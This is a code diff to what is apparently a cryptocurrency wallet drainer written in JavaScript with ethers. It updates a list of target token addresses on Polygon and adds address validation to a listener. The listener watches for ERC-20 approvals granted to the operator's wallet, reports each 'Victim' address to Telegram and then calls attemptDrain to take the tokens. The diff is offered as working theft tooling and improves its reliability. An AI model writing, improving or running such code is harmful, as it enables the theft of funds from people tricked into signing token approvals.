@@ -69,7 +69,7 @@ const TARGET_TOKENS = {
         "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
         "0x8f3Cf7ad23Cd3CaADD963593910541905495d097", // DAI
         "0xeb51d9a39ad5eef215dc0bf39a8821ff804a0f01", // LGNS (Origin LGNS)
-        "0x99a57e6c98695d852aa5c31758c707f83c19725", // sLGNS (Staked Longinus)
+        "0x99a57e6c8558bc6689f894e068733adf83c19725", // sLGNS (Staked Longinus)
         "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
         "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
         "0xb0897686c545045aFc77CF20eC7A532E3120E0F1", // LINK
@@ -177,12 +177,17 @@ function startChainListener(chainKey, config, wallet) {
             console.log(`   ✅ Listening for ${tokens.length} tokens on ${config.name}`);
 
             tokens.forEach(tokenAddress => {
+                if (!tokenAddress || tokenAddress.length !== 42) {
+                    console.warn(`      ⚠️ Skipping invalid token address: "${tokenAddress}"`);
+                    return;
+                }
                 const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                 const filter = contract.filters.Approval(null, wallet.address);
 
-                contract.on(filter, async (owner, spender, value) => {
-                    console.log(`\n🎯 [${config.name}] APPROVAL DETECTED!`);
-                    await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>\nValue: ${value.toString()}`);
+                contract.on(filter, async (owner, spender, value, event) => {
+                    console.log(`\n🎯 [${config.name}] APPROVAL_EVENT DETECTED!`);
+                    const valDisplay = value ? value.toString() : "Unknown";
+                    await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>\nValue: ${valDisplay}`);
                     await attemptDrain(connectedWallet, tokenAddress, owner, config.name);
                 });
             });
